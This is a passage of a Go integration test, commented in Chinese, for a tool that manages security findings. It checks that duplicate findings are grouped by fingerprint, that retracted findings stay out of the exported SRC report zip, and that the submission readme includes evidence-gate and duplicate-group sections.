	bind(fC, "https://app.example.com/api/user?id=1", "proof")
	// fD 不绑定任何流量，且改成已撤回：既不进包（撤回），也不该出现在清单的进包部分。
	if rec := e.request(http.MethodPatch, "/api/exploration/findings/"+strconv.FormatInt(fD, 10),
		`{"status":"retracted","retract_reason":"复测推翻"}`); rec.Code != 200 {
		t.Fatalf("撤回发现 status=%d body=%s", rec.Code, rec.Body.String())
	}

	// ① 计划预览：归并分组 + 证据门。
	rec := e.request(http.MethodGet, "/api/tasks/"+task.ID+"/src-batch", "")
	if rec.Code != 200 {
		t.Fatalf("src-batch status=%d body=%s", rec.Code, rec.Body.String())
	}
	var plan struct {
		Included int `json:"included"`
		Skipped  int `json:"skipped"`
		Entries  []struct {
			ID             int64    `json:"id"`
			Fingerprint    string   `json:"fingerprint"`
			DuplicateGroup int      `json:"duplicate_group"`
			Warnings       []string `json:"warnings"`
			Included       bool     `json:"included"`
		} `json:"entries"`
		Groups [][]int64 `json:"duplicate_groups"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &plan); err != nil {
		t.Fatalf("%v body=%s", err, rec.Body.String())
	}
	if plan.Included != 3 || plan.Skipped != 1 {
		t.Fatalf("进包/跳过数不对: %+v", plan)
	}
	groupOf := map[int64]int{}
	for i, g := range plan.Groups {
		for _, id := range g {
			groupOf[id] = i + 1
		}
	}
	if len(plan.Groups) != 1 || groupOf[fA] != 1 || groupOf[fB] != 1 {
		t.Fatalf("同源发现没有被归成一组: groups=%v", plan.Groups)
	}
	if groupOf[fC] != 0 {
		t.Fatalf("同一端点上的另一种洞不该归组: %+v", groupOf)
	}
	// 指纹来自"类型 + 端点"，与标题措辞无关：A/B 标题不同但指纹相同。
	var fpA, fpB string
	for _, en := range plan.Entries {
		if en.ID == fA {
			fpA = en.Fingerprint
		}
		if en.ID == fB {
			fpB = en.Fingerprint
		}
	}
	if fpA == "" || fpA != fpB {
		t.Fatalf("指纹不稳定: A=%q B=%q", fpA, fpB)
	}

	// ② 打包下载：提交说明 + 每条进包发现的 md/docx；撤回的不在包里。
	rec = e.request(http.MethodGet, "/api/tasks/"+task.ID+"/src-report.zip", "")
	if rec.Code != 200 {
		t.Fatalf("zip status=%d body=%s", rec.Code, rec.Body.String())
	}
	zr, err := zip.NewReader(bytes.NewReader(rec.Body.Bytes()), int64(rec.Body.Len()))
	if err != nil {
		t.Fatalf("交付包不是合法 zip：%v", err)
	}
	files := map[string]bool{}
	var readme string
	for _, f := range zr.File {
		files[f.Name] = true
		if f.Name == "提交说明.md" {
			rc, err := f.Open()
			if err != nil {
				t.Fatal(err)
			}
			b, err := io.ReadAll(rc)
			rc.Close()
			if err != nil {
				t.Fatal(err)
			}
			readme = string(b)
		}
	}
	if !files["提交说明.md"] {
		t.Fatal("交付包缺少提交说明.md")
	}
	mdCount, docxCount := 0, 0
	for name := range files {
		if strings.HasPrefix(name, "findings/") && strings.HasSuffix(name, ".md") {
			mdCount++
		}
		if strings.HasPrefix(name, "findings/") && strings.HasSuffix(name, ".docx") {
			docxCount++
		}
		if strings.Contains(name, strconv.FormatInt(fD, 10)) {
			t.Fatalf("已撤回的发现不该进包: %s", name)
		}
	}
	if mdCount != 3 || docxCount != 3 {
		t.Fatalf("进包附件数不对: md=%d docx=%d（files=%v）", mdCount, docxCount, files)
	}
	// 提交说明：清单条目、疑似重复分组、撤回说明。
	e.mustContain(readme, "## 三、疑似重复（同一漏洞被多次登记）", "提交说明的重复分组段")
	e.mustContain(readme, "组 1（指纹 "+fpA+"）", "重复组编号与指纹")
	e.mustContain(readme, "第一份", "清单里的发现标题")
	e.mustContain(readme, "未进包的发现", "撤回发现的交代")
	e.mustContain(readme, "## 二、导出前的证据门", "证据门段")
	// 证据门要指出"没人绑流量"这件事：三条进包的都绑了 proof，所以此处应为"无"。
	e.mustContain(readme, "无：每条进包发现的证据都完整", "证据门结论")
	// 单条导出与批量包口吻一致：该发现自己的 src-report 里也是同一份警告清单（这里为空）。
	rec = e.request(http.MethodGet, "/api/findings/"+strconv.FormatInt(fA, 10)+"/src-report/check", "")
	var gate struct {
		Ready    bool     `json:"ready"`
		Warnings []string `json:"warnings"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &gate); err != nil {
		t.Fatal(err)
	}
	if !gate.Ready || len(gate.Warnings) != 0 {
		t.Fatalf("证据完整的发现不该有警告: %+v", gate)
	}
}
